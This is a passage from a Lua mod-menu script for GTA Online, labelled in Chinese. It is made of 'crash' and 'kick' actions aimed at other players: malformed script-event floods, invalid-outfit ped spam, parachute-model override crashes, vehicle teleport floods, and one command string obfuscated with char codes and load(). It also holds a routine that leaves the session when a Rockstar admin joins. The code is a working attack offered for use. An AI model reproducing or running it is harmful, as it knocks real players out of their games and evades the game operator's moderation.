        if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) then
            util.toast("Sin control de "..ent)
        end
        return NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent)
    end
   	menu.action(player_removals, "四面八方的愤怒", {"fennu"}, "", function ()
        menu.trigger_commands("huochefeijifly " .. players.get_name(PlayerID))
        menu.trigger_commands("xiaofangshuan " .. players.get_name(PlayerID))
         notification( "崩溃完成", colors.black)
    end)

    menu.toggle_loop(player_removals, "无效载具崩溃V1", {"invalidclothesv1"}, "", function ()
       BadOutfitCrashV1(PlayerID)
    end)

	menu.toggle_loop(player_removals, "无效载具崩溃V2", {"BadNetVehicleCrashV2"}, "", function()
	      local TPP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
		  local pos = ENTITY.GET_ENTITY_COORDS(TPP, true)
		  pos.z = pos.z + 5
		  veh = entities.get_all_vehicles_as_handles()
		  
        for i = 1, #veh do
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh[i])
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh[i], pos.x,pos.y,pos.z, ENTITY.GET_ENTITY_HEADING(TPP), 10)
        TASK.TASK_VEHICLE_TEMP_ACTION(TPP, veh[i], 18, 999)
        TASK.TASK_VEHICLE_TEMP_ACTION(TPP, veh[i], 16, 999)
		end
	end)
------------------------------------------------------感谢daidai脚本-------------------------------------------------------------------
    menu.action(player_removals, "GGB崩", {}, "", function(on_input)
    store_dir = filesystem.store_dir() .. '\\YMss\\'
      sound_selection_dir = store_dir .. '\\sound13.txt'
      if not filesystem.is_dir(store_dir) then
         util.toast("夜幕音频没有正确安装！.")
         util.stop_script()
end
fp = io.open(sound_selection_dir, 'r')
local file_selection = fp:read('*a')
fp:close()
local sound_location = store_dir .. '\\' .. file_selection
if not filesystem.exists(sound_location) then
    util.toast("[Startup Sound] " .. file_selection .. " 未找到音源.")
else
    PlaySound(sound_location, SND_FILENAME | SND_ASYNC)
end
util.keep_running()
    local crash_tbl = {"SWYHWTGYSWTYSUWSLSWTDSEDWSRTDWSOWSW45ERTSDWERTSVWUSWS5RTDFSWRTDFTSRYE","6825615WSHKWJLW8YGSWY8778SGWSESBGVSSTWSFGWYHSTEWHSHWG98171S7HWRUWSHJH","GHWSTFWFKWSFRWDFSRFSRTDFSGICFWSTFYWRTFYSSFSWSYWSRTYFSTWSYWSKWSFCWDFCSW",}
    local crash_tbl_2 = {{17, 32, 48, 69},{14, 30, 37, 46, 47, 63},{9, 27, 28, 60}}
        if PlayerID == players.user() then
            util.toast("夜幕提醒" .. players.get_name(players.user()) .. "\n你不能崩溃你自己哦")
            return 
        end
        if PlayerID == players.get_host() then 
            util.toast("夜幕提醒" .. players.get_name(players.user()) .. "\n你不能崩溃主机哦")
                    return
        end
            util.toast("[夜幕 提示]\n正在崩溃中")
            util.yield(1000)
    local cur_crash_meth = ""
    local cur_crash = ""
        for a,b in pairs(crash_tbl_2) do
            cur_crash = ""
            for c,d in pairs(b) do
                cur_crash = cur_crash .. string.sub(crash_tbl[a], d, d)
        end
            cur_crash_meth = cur_crash_meth .. cur_crash
            end
    local crash_keys = {"NULL", "VOID", "NaN", "127563/0", "NIL"}
    local crash_table = {109, 101, 110, 117, 046, 116, 114, 105, 103, 103, 101, 114, 095, 099, 111, 109, 109, 097, 110, 100, 115, 040}
    local crash_str = ""
        for k,v in pairs(crash_table) do
            crash_str = crash_str .. string.char(crash_table[k])
        end
    menu.trigger_commands("spectate" .. players.get_name(players.user()))
        util.yield(500)
            local this_int = 1
            while this_int < 1000 do 
                this_int += 1
        end
            local crash_compiled_func = load(crash_str .. '\"' .. cur_crash_meth .. players.get_name(PlayerID) .. '\")')
            pcall(crash_compiled_func)
    end)
    menu.toggle_loop(player_removals, '超级无敌世界爆炸宇宙毁灭崩1.1', {}, '配置低误用！！电脑配置不好会子崩别TM赖脚本不好用！', function (on)
       if on then 
        menu.trigger_commands("huochefeijifly".. PLAYER.GET_PLAYER_NAME(PlayerID))
        menu.trigger_commands("invalidclothesv1".. PLAYER.GET_PLAYER_NAME(PlayerID))
        menu.trigger_commands("BadNetVehicleCrashV2".. PLAYER.GET_PLAYER_NAME(PlayerID))
        menu.trigger_commands("5gcrash".. PLAYER.GET_PLAYER_NAME(PlayerID))
        menu.trigger_commands("six6crash".. PLAYER.GET_PLAYER_NAME(PlayerID))
        menu.trigger_commands("axery".. PLAYER.GET_PLAYER_NAME(PlayerID))
        menu.trigger_commands("xiaofangshuan".. PLAYER.GET_PLAYER_NAME(PlayerID))
        menu.trigger_commands("huochefeijifly".. PLAYER.GET_PLAYER_NAME(PlayerID))
        else 
        menu.trigger_commands("huochefeijifly".. PLAYER.GET_PLAYER_NAME(PlayerID))
        menu.trigger_commands("invalidclothesv1".. PLAYER.GET_PLAYER_NAME(PlayerID))
        menu.trigger_commands("BadNetVehicleCrashV2".. PLAYER.GET_PLAYER_NAME(PlayerID))
        menu.trigger_commands("5gcrash".. PLAYER.GET_PLAYER_NAME(PlayerID))
        menu.trigger_commands("six6crash".. PLAYER.GET_PLAYER_NAME(PlayerID))
        menu.trigger_commands("axery".. PLAYER.GET_PLAYER_NAME(PlayerID))
        menu.trigger_commands("xiaofangshuan".. PLAYER.GET_PLAYER_NAME(PlayerID))
        menu.trigger_commands("huochefeijifly".. PLAYER.GET_PLAYER_NAME(PlayerID))
        end
    end)
    menu.action(wanjiabengkui, "kuku崩", {"kukucrash"}, "崩溃玩家", function()
    YMscript_logo = directx.create_texture(filesystem.scripts_dir() .. '/YMS/'..'kuku.png')
if SCRIPT_MANUAL_START then
    AUDIO.PLAY_SOUND(-1, "Virus_Eradicated", "LESTER1A_SOUNDS", 0, 0, 1)
    logo_alpha = 0
    logo_alpha_incr = 0.01
    logo_alpha_thread = util.create_thread(function (thr)
        while true do
            logo_alpha = logo_alpha + logo_alpha_incr
            if logo_alpha > 1 then
                logo_alpha = 1
            elseif logo_alpha < 0 then
                logo_alpha = 0
                util.stop_thread()
            end
            util.yield()
        end
    end)

    logo_thread = util.create_thread(function (thr)
        starttime = os.clock()
        local alpha = 0
        while true do
            directx.draw_texture(YMscript_logo,  0.1, 0.3, 0.3, 0.6, 0.45, 0.5,0, 1, 1, 1, logo_alpha)
            timepassed = os.clock() - starttime
            if timepassed > 3 then
                logo_alpha_incr = -0.01
            end
            if logo_alpha == 0 then
                util.stop_thread()
            end
            util.yield()
        end
    end)
end
        local int_min = -2147483647
        local int_max = 2147483647
        for i = 1, 20 do
            util.trigger_script_event(1 << PlayerID, {697566862, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149, math.random(int_min, int_max), math.random(int_min, int_max), 
            math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
            math.random(int_min, int_max), PlayerID, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
            util.trigger_script_event(1 << PlayerID, {697566862, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149})
        end
        for i = 1, 20 do
            util.trigger_script_event(1 << PlayerID, {697566862, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149, PlayerID, math.random(int_min, int_max)})
            util.trigger_script_event(1 << PlayerID, {697566862, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149})
            util.trigger_script_event(1 << PlayerID, {697566862, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149})
        end
        for i = 1, 15 do
            util.trigger_script_event(1 << PlayerID, {-904555865, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149, PlayerID, math.random(int_min, int_max)})
            util.trigger_script_event(1 << PlayerID, {-904555865, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149})
        end
        util.trigger_script_event(1 << PlayerID, {-904555865, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149})
        for i = 1, 15 do
            util.trigger_script_event(1 << PlayerID, {-904555865, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149, math.random(int_min, int_max), math.random(int_min, int_max), 
            math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
            math.random(int_min, int_max), PlayerID, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
            util.trigger_script_event(1 << PlayerID, {-904555865, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149})
        end
        menu.trigger_commands("givesh" .. players.get_name(PlayerID))
        util.yield(200)
        for i = 1, 200 do
            util.trigger_script_event(1 << PlayerID, {548471420, 16, 804923209, -303901118, 577104152, 653299499, -1218005427, -1010050857, 1831797592, 1508078618, 9, -700037855, -1565442250, 932677838})
        end
    end)
function BadOutfitCrashV1(PlayerID)
menu.trigger_commands("anticrashcam on")
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    local SelfPlayerPed = PLAYER.PLAYER_PED_ID();
    local Spawned_Mike = CreatePed(26, util.joaat("player_zero"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    for i = 0, 500 do
        PED.SET_PED_COMPONENT_VARIATION(Spawned_Mike, 0, 0, math.random(0, 10), 0)
        ENTITY.SET_ENTITY_COORDS(Spawned_Mike, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, true, false, false, true);
        util.yield(10)
    end
    entities.delete_by_handle(Spawned_Mike)
    menu.trigger_commands("anticrashcam off")
end
menu.action(wanjiabengkui, "GZS崩溃", {}, "GZScrash", function()
          YMscript_logo = directx.create_texture(filesystem.scripts_dir() .. '/YMS/'..'GZS.png')
        if SCRIPT_MANUAL_START then
    AUDIO.PLAY_SOUND(-1, "Virus_Eradicated", "LESTER1A_SOUNDS", 0, 0, 1)
    logo_alpha = 0
    logo_alpha_incr = 0.01
    logo_alpha_thread = util.create_thread(function (thr)
        while true do
            logo_alpha = logo_alpha + logo_alpha_incr
            if logo_alpha > 1 then
                logo_alpha = 1
            elseif logo_alpha < 0 then
                logo_alpha = 0
                util.stop_thread()
            end
            util.yield()
        end
    end)

    logo_thread = util.create_thread(function (thr)
        starttime = os.clock()
        local alpha = 0
        while true do
            directx.draw_texture(YMscript_logo,  0.1, 0.3, 0.3, 0.6, 0.45, 0.5,0, 1, 1, 1, logo_alpha)
            timepassed = os.clock() - starttime
            if timepassed > 3 then
                logo_alpha_incr = -0.01
            end
            if logo_alpha == 0 then
                util.stop_thread()
            end
            util.yield()
        end
    end)
end
    BadOutfitCrashV1(PlayerID)
     notification("崩溃结束.")
end)

if bailOnAdminJoin then
        if players.is_marked_as_admin(PlayerID) and not players.user() then
            util.toast(players.get_name(PlayerID) .. "是Rockstar管理员,夜幕已为你自动退出战局.")
            menu.trigger_commands("quickbail")
            return
        end
 end
end

players.on_join(player)
players.dispatch_on_join()

quanjubengkui = menu.list(quanju,"全局崩溃", {},"崩溃全局~")
    menu.action(quanjubengkui, "AIO踢", {"allaiokick", "allaiok"}, "可能在某些菜单上不起作用.", function ()
       AIOKickAll()
    end)
    menu.action(quanjubengkui, "人物伞崩全局v1", {}, "崩溃其他玩家游戏", function()
        local SelfPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
        local PreviousPlayerPos = ENTITY.GET_ENTITY_COORDS(SelfPlayerPed, true)
        for n = 0 , 3 do
            local object_hash = util.joaat("prop_logpile_06b")
            STREAMING.REQUEST_MODEL(object_hash)
              while not STREAMING.HAS_MODEL_LOADED(object_hash) do
               util.yield()
            end
            PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, 0,0,500, false, true, true)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(SelfPlayerPed, 0xFBAB5776, 1000, false)
            util.yield(1000)
            for i = 0 , 20 do
                PED.FORCE_PED_TO_OPEN_PARACHUTE(SelfPlayerPed)
            end
            util.yield(1000)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z, false, true, true)
    
            local object_hash2 = util.joaat("prop_beach_parasol_03")
            STREAMING.REQUEST_MODEL(object_hash2)
              while not STREAMING.HAS_MODEL_LOADED(object_hash2) do
               util.yield()
            end
            PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash2)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, 0,0,500, 0, 0, 1)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(SelfPlayerPed, 0xFBAB5776, 1000, false)
            util.yield(1000)
            for i = 0 , 20 do
                PED.FORCE_PED_TO_OPEN_PARACHUTE(SelfPlayerPed)
            end
            util.yield(1000)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z, false, true, true)
        end
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z, false, true, true)
        notification( "崩溃完成", green)
    end)
    menu.action(quanjubengkui, "载具伞崩全局", {}, "崩溃全局", function ()
        local SelfPlayerPed = PLAYER.PLAYER_PED_ID()
        local PreviousPlayerPos = ENTITY.GET_ENTITY_COORDS(SelfPlayerPed, true)
        for i = 1, 20 do
            local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(SelfPlayerPed, true)
            local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed), true)
            PED.SET_PED_INTO_VEHICLE(SelfPlayerPed, Ruiner2, -1)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 1000, false, true, true)
            util.yield(200)
            VEHICLE._SET_VEHICLE_PARACHUTE_MODEL(Ruiner2, util.joaat("prop_beach_parasol_05"))
            VEHICLE._SET_VEHICLE_PARACHUTE_ACTIVE(Ruiner2, true)
            util.yield(200)
            entities.delete_by_handle(Ruiner2)
        end
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z, false, true, true)
        notification( "崩溃完成", green)
    end)
    menu.click_slider(quanjubengkui,"仿西普肉伞崩", {""}, "1=null伞 2=车伞", 1, 2, 1, 1, function(on_change)
            if on_change == 1 then	
        notification("崩溃开始" ,colors.black)
        local TPP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(TPP, true)
        local SelfPlayerPed = CreatePed(26, util.joaat("player_one"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))  
for i = 0 , -1 do 
local SelfPlayerPed = CreatePed(26, util.joaat("player_one"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))      
ENTITY.SET_ENTITY_INVINCIBLE(SelfPlayerPed, true)
util.yield()
end
for i = 1, 30 do                     
ENTITY.SET_ENTITY_INVINCIBLE(SelfPlayerPed, true)
local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed), true)
PED.SET_PED_INTO_VEHICLE(SelfPlayerPed, Ruiner2, -1)
ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 1000, false, true, true)
util.yield(200)
VEHICLE._SET_VEHICLE_PARACHUTE_MODEL(Ruiner2, util.joaat("prop_beach_parasol_08"))
VEHICLE._SET_VEHICLE_PARACHUTE_ACTIVE(Ruiner2, true)
util.yield(200)
entities.delete_by_handle(Ruiner2)
end        
    notification("崩溃结束" ,colors.black)
end

if on_change == 2 then
        notification("崩溃执行开始" ,colors.black)
        local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), true)
        local SelfPlayerPed = entities.create_ped(2, util.joaat("u_m_m_jesus_01"), SelfPlayerPos, 0)
        for i = 1, 30 do                   
            ENTITY.SET_ENTITY_INVINCIBLE(SelfPlayerPed, true)
            local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed), true)
            PED.SET_PED_INTO_VEHICLE(SelfPlayerPed, Ruiner2, -1)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 1000, false, true, true)
            util.yield(300)
            notification("崩溃执行中" ,colors.black)
VEHICLE._SET_VEHICLE_PARACHUTE_MODEL(Ruiner2, util.joaat("prop_beach_parasol_08"))
VEHICLE._SET_VEHICLE_PARACHUTE_ACTIVE(Ruiner2, true)
            util.yield(300)
            entities.delete_by_handle(Ruiner2)
            entities.delete_by_handle(SelfPlayerPed)
        end
        notification("崩溃执行结束" ,colors.black)
end

end)
 
    menu.action(quanjubengkui,"人物伞崩全局V2",{},"崩溃全局",function()
       wudihh()
       notification( "崩溃完成", green)
    end)
    menu.action(quanjubengkui,"人物伞崩全局V3",{},"崩溃全局",function()
       renwusanrnm()
       notification( "崩溃完成", green)
    end)
    menu.action(quanjubengkui, "人物伞崩全局V4", {""}, "强力崩溃", function()
      for n = 0 , 5 do
        PEDP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
        object_hash = 1117917059
                                    STREAMING.REQUEST_MODEL(object_hash)
        while not STREAMING.HAS_MODEL_LOADED(object_hash) do
           util.yield()
         end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
        util.yield(1000)
        for i = 0 , 20 do
        PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
        end
        util.yield(1000)
        menu.trigger_commands("tplsia")
        bush_hash = 1117917059
                                    STREAMING.REQUEST_MODEL(bush_hash)
      while not STREAMING.HAS_MODEL_LOADED(bush_hash) do
           util.yield()
         end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),bush_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
           util.yield(1000)
        for i = 0 , 20 do
        PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
        end
        util.yield(1000)
        menu.trigger_commands("tplsia")
end
       notification( "崩溃完成", green)
end)
    menu.action(quanjubengkui,"人物伞崩全局V5",{},"崩溃全局",function()
        rlengzhan()
       notification( "崩溃完成", green)
    end)  
    menu.action(quanjubengkui, "人物伞崩全局V6", {""}, "", function()
for n = 0 , 5 do
    PEDP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
    object_hash = 2186304526
                                STREAMING.REQUEST_MODEL(object_hash)
  while not STREAMING.HAS_MODEL_LOADED(object_hash) do
       util.yield()
     end
    PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
    WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
    util.yield(800)
    for i = 0 , 20 do
    PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
    end
    util.yield(800)
    menu.trigger_commands("tpmazehelipad")
    PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),0xE5022D03)
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
    util.yield(1)
    local p_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),p_pos.x,p_pos.y,p_pos.z,false,true,true)
    WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()), 0xFBAB5776, 1000, false)
    TASK.TASK_PARACHUTE_TO_TARGET(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),-1087,-3012,13.94)
    util.yield(300)
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
    util.yield(800)
    PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(PLAYER.PLAYER_ID())
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
    bush_hash = 1047645690
                                STREAMING.REQUEST_MODEL(bush_hash)
  while not STREAMING.HAS_MODEL_LOADED(bush_hash) do
       util.yield()
     end
    PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),bush_hash)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
    WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
       util.yield(800)
    for i = 0 , 20 do
    PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
    end
    util.yield(800)
    menu.trigger_commands("tpfortzancudo")
    PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),0xE5022D03)
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
    util.yield(1)
    local p_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()), 0xFBAB5776, 1000, false)
    TASK.TASK_PARACHUTE_TO_TARGET(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),-1087,-3012,13.94)
    util.yield(300)
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
    util.yield(800)
    PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(PLAYER.PLAYER_ID())
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
    bush_hash = 3456106952
    STREAMING.REQUEST_MODEL(bush_hash)
while not STREAMING.HAS_MODEL_LOADED(bush_hash) do
util.yield()
end
PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),bush_hash)
ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
util.yield(800)
for i = 0 , 20 do
PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
end
util.yield(800)
menu.trigger_commands("tplsia")
PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),0xE5022D03)
TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
util.yield(1)
local p_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()), 0xFBAB5776, 1000, false)
TASK.TASK_PARACHUTE_TO_TARGET(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),-1087,-3012,13.94)
util.yield(500)
TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
util.yield(1000)
PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(PLAYER.PLAYER_ID())
TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
end
notification("崩溃执行结束" ,colors.black)
end)
menu.action(quanjubengkui, "人物伞崩全局V7", {""}, "", function()
notification("开崩" ,colors.black)
for n = 0 , 5 do
    PEDP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
    object_hash = 2186304526
                                STREAMING.REQUEST_MODEL(object_hash)
  while not STREAMING.HAS_MODEL_LOADED(object_hash) do
       util.yield()
     end
    PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
    WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
    util.yield(800)
    for i = 0 , 20 do
    PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
    end
    util.yield(800)
    menu.trigger_commands("tpmazehelipad")
    end
    notification("崩溃执行结束" ,colors.black)
end)

menu.action(quanjubengkui, "人物伞崩全局V8", {""}, "", function()
notification("开始崩溃", colors.black)
for n = 0 , 2 do
    PEDP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
    object_hash = 1381105889
                                STREAMING.REQUEST_MODEL(object_hash)
  while not STREAMING.HAS_MODEL_LOADED(object_hash) do
       util.yield()
     end
    PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
